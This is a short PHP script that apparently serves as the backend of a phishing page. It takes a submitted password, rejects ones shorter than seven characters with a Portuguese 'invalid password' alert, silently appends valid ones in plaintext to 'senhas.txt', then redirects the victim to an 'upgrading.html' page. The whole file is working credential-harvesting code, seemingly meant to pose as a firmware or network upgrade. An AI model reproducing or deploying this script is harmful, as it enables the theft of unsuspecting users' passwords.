<?php
if (isset($_POST["password1"])){
	if (strlen($_POST["password1"]) < 7){
		echo ("<SCRIPT LANGUAGE='JavaScript'>
window.alert('Senha inválida!')
window.location.href='index.html';
</SCRIPT>");
	} else {

	$file = "senhas.txt";

	file_put_contents($file, $_POST["password1"]."\n", FILE_APPEND | LOCK_EX);
	

	}
sleep(2);
header("location:upgrading.html");
die();
}
?>

